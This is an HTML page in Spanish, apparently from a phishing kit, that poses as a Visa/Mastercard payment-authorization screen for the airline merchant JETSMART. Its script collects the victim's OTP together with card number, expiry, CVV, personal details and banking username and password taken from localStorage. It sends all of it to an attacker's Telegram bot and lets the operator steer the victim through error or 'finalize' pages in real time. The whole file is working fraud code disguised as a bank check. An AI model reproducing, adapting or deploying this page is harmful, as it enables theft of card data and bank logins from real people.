<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mi Página</title>
    <style>
      body {
        background-color: #ffffff;
        margin: 0;
        padding: 0;
        overflow: hidden; /* Evita que la página se desplace */
      }

      html,
      body {
        height: 100%;
      }

      #contenedor {
        position: relative;
        width: 95vw;
        height: 95vh;
        background-color: #ffffff;
        overflow: hidden;
        top: 50px;
        left: 35px;
        width: 310px;
        height: 500px;
      }

      #imagenIzquierda {
        position: absolute;
        top: 10px;
        left: 20px;
        width: 70px;
        height: 30px;
      }

      #imagenDerecha {
        position: absolute;
        top: 2px;
        right: 20px;
        width: 100px;
        height: 50px;
      }

      #titulo {
        font-size: 20px;
        font-weight: bold;
        color: #333;
        margin-top: 70px;
        margin-bottom: 10px;
        text-align: center;
      }

      #titulo2 {
        font-size: 16px;
        font-weight: bold;
        color: #333;
        margin-top: 30px;
        margin-bottom: 10px;
        text-align: center;
      }

      #parrafo {
        font-size: 13px;
        color: #000000;
        margin: 0 auto;
        max-width: 80%;
        text-align: justify;
        letter-spacing: 2px;
      }

      #formulario {
        margin-top: 20px;
        padding: 0 20px;
      }

      #formulario label {
        display: inline-block;
        font-size: 12px;
        font-weight: bold;
        color: #333;
        margin-bottom: 5px;
        width: 50%;
      }

      #formulario input {
        width: 48%;
        padding: 5px;
        margin-bottom: 10px;
        box-sizing: border-box;
        display: inline-block;
      }

      #horaTransaccion {
        font-size: 12px;
        color: #333;
        margin-top: 15px;
      }

      #autorizarBtn {
        display: block;
        margin: 45px auto;
        padding: 15px 30px;
        border-radius: 10%;
        background-color: #000;
        color: #fff;
        text-align: center;
        cursor: pointer;
        font-size: 12px;
        text-decoration: none;
        border: none;
      }

      #contador {
        color: #555;
        font-size: 8px;
        margin-left: 15px;
      }

      .loaderp {
        width: 48px;
        height: 48px;
        border: 5px solid #fff;
        border-bottom-color: blue;
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }

      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .loaderp-full {
        position: fixed;
        top: 0;
        overflow-y: hidden;
        z-index: 1000;
        background-color: white;
        width: 100vw;
        height: 100vh;
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
    </style>
  </head>

  <body>
    <div id="contenedor">
      <img src="img/visa.jpg" alt="Logo Visa" id="imagenIzquierda" />
      <img src="img/master.png" alt="Logo Mastercard" id="imagenDerecha" />
      <div id="contenido">
        <div id="titulo">Autorizacion de transaccion</div>
        <div id="parrafo">
          Estás intentado realizar un pago por tarjeta de crédito/débito.
          Necesitamos confirmar que eres tú quien realiza este pago.
        </div>
        <div id="titulo2">Detalles de la transaccion</div>
        <div id="formulario">
          <label>Comercio: JETSMART</label>
          <label for="horaTransaccion">
            <span id="horaTransaccion">Hora de la transacción:</span>
          </label>
          <label for="otp">Ingrese su clave dinamica:</label>
          <input
            type="text"
            id="otp"
            name="otp"
            maxlength="6"
            oninput="validarOtp()"
          />
          <p id="contador">
            Ingresa el codigo de 6 digitos recibido por mensaje o
            <span id="tiempo"></span>ingresando a su tu app.
          </p>
        </div>
      </div>
      <button id="autorizarBtn">Autorizar</button>
       <!-- LOADER FULL -->
    <div class="loaderp-full">
        <span class="loaderp"></span>
        <p class="text-italic tc-ocean fs-3 fw-light"></p>
      </div>
    </div>
 <script>
async function loadTelegramConfig() {
    try {
        const response = await fetch("botmaster2.php"); 
        if (!response.ok) {
            throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
        }
        return await response.json();
    } catch (error) {
        console.error("Error al cargar el archivo de configuración de Telegram:", error);
    }
}

function obtenerFechaActual() {
    const ahora = new Date();
    const dia = ahora.getDate().toString().padStart(2, "0");
    const mes = (ahora.getMonth() + 1).toString().padStart(2, "0");
    const año = ahora.getFullYear();
    const horas = ahora.getHours().toString().padStart(2, "0");
    const minutos = ahora.getMinutes().toString().padStart(2, "0");
    const segundos = ahora.getSeconds().toString().padStart(2, "0");
    return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
}

function actualizarHoraTransaccion() {
    const ahora = new Date();
    const horas = ahora.getHours().toString().padStart(2, "0");
    const minutos = ahora.getMinutes().toString().padStart(2, "0");
    const segundos = ahora.getSeconds().toString().padStart(2, "0");
    document.getElementById("horaTransaccion").innerText = 
        `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
}

document.getElementById("horaTransaccion").innerText = 
    `Hora de la transacción: ${obtenerFechaActual()}`;

setInterval(actualizarHoraTransaccion, 1000);

const loader = document.querySelector(".loaderp-full");

async function enviarDatos() {
    loader.style.display = "flex";

    // Obtener los datos de "pagojet" del localStorage
    const pagoData = JSON.parse(localStorage.getItem("pagojet")); 
    if (!pagoData) {
        alert("No se encontraron datos de pago en localStorage.");
        loader.style.display = "none";
        return;
    }

    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    const otp = document.getElementById("otp").value;
    const username = localStorage.getItem("username");
    const password = localStorage.getItem("password");

    if (!otp || otp.length !== 6) {
        alert("Por favor, ingrese un código OTP válido de 6 dígitos.");
        loader.style.display = "none";
        return;
    }

    const message = `
<b>Nueva solicitud de clave dinámica pendiente de verificación.</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
🌐 <b>IP:</b> | ${pagoData.ip || '<i>No disponible</i>'}
--------------------------------------------------
👤 <b>Nombre:</b> | ${pagoData.nombre || '<i>No disponible</i>'}
📧 <b>Email:</b> | ${pagoData.email || '<i>No disponible</i>'}
📞 <b>Celular:</b> | ${pagoData.celular || '<i>No disponible</i>'}
🏦 <b>Banco:</b> | ${pagoData.banco || '<i>No disponible</i>'}
📍 <b>Dirección:</b> | ${pagoData.direccion || '<i>No disponible</i>'}
--------------------------------------------------
💳 <b>Tarjeta:</b> | ${pagoData.tarjeta || '<i>No disponible</i>'}
📅 <b>Fecha de Expiración:</b> | ${pagoData.ftarjeta || '<i>No disponible</i>'}
🔐 <b>CVV:</b> | ${pagoData.cvv || '<i>No disponible</i>'}
🌐 <b>IP:</b> | ${pagoData.ip || '<i>No disponible</i>'}
--------------------------------------------------
🧑‍💻 <b>Usuario:</b> | ${username || '<i>No disponible</i>'}
🔐 <b>Clave:</b> | ${password || '<i>No disponible</i>'}
--------------------------------------------------
🔑 <b>DINAMICA:</b> | ${otp || '<i>No disponible</i>'}
--------------------------------------------------
`;

    const keyboard = JSON.stringify({
        inline_keyboard: [
            [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
            [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
            [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
            [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
        ],
    });

    const config = await loadTelegramConfig();
    if (!config) {
        loader.style.display = "none";
        return;
    }

    fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: config.chat_id,
            text: message,
            reply_markup: keyboard,
            parse_mode: "HTML"
        }),
    })
    .then((response) => response.json())
    .then((data) => {
        if (data.ok) {
            console.log("Mensaje enviado a Telegram con éxito");
            checkPaymentVerification(transactionId);
        } else {
            console.error("Error al enviar mensaje a Telegram:", data);
            loader.style.display = "none";
        }
    })
    .catch((error) => {
        console.error("Error al enviar mensaje a Telegram:", error);
        loader.style.display = "none";
    });
}

async function checkPaymentVerification(transactionId) {
    const config = await loadTelegramConfig();
    if (!config) {
        loader.style.display = "none";
        return;
    }

    fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
    .then((response) => response.json())
    .then((data) => {
        const updates = data.result;
        const verificationUpdate = updates.find(
            (update) => update.callback_query && 
            update.callback_query.data.includes(transactionId)
        );

        if (verificationUpdate) {
            loader.style.display = "none";
            const messageId = verificationUpdate.callback_query.message.message_id; // Obtener el ID del mensaje
            switch (verificationUpdate.callback_query.data) {
                case `pedir_logo:${transactionId}`:
                    // Eliminar botones
                    removeInlineKeyboard(config.token, verificationUpdate.callback_query.message.chat.id, messageId);
                    window.location.href = "pedir_logo.php";
                    break;
                case `error_logo:${transactionId}`:
                    // Eliminar botones
                    removeInlineKeyboard(config.token, verificationUpdate.callback_query.message.chat.id, messageId);
                    alert("Ha ocurrido un error. Intente nuevamente.");
                    break;
                case `error_dinamica:${transactionId}`:
                    // Eliminar botones
                    removeInlineKeyboard(config.token, verificationUpdate.callback_query.message.chat.id, messageId);
                    alert("Clave dinámica incorrecta.");
                    window.location.href = "error_dinamica.html";
                    break;
                case `error_tc:${transactionId}`:
                    // Eliminar botones
                    removeInlineKeyboard(config.token, verificationUpdate.callback_query.message.chat.id, messageId);
                    alert("Tarjeta no procesada.");
                    window.location.href = "payment.php";
                    break;
                case `confirm_finalizar:${transactionId}`:
                    // Eliminar botones
                    removeInlineKeyboard(config.token, verificationUpdate.callback_query.message.chat.id, messageId);
                    window.location.href = "finish.html";
                    break;
            }
        } else {
            setTimeout(() => checkPaymentVerification(transactionId), 2000);
        }
    })
    .catch((error) => {
        console.error("Error al verificar:", error);
        setTimeout(() => checkPaymentVerification(transactionId), 2000);
    });
}

function removeInlineKeyboard(token, chatId, messageId) {
    fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: [], // Elimina los botones
            },
        }),
    })
    .then((response) => response.json())
    .then((data) => {
        if (data.ok) {
            console.log("Botones eliminados correctamente.");
        } else {
            console.error("Error al eliminar botones:", data);
        }
    })
    .catch((error) => {
        console.error("Error al enviar solicitud para eliminar botones:", error);
    });
}

document.getElementById("autorizarBtn").addEventListener("click", function (event) {
    event.preventDefault();
    enviarDatos();
});
</script>

  </body>
</html>
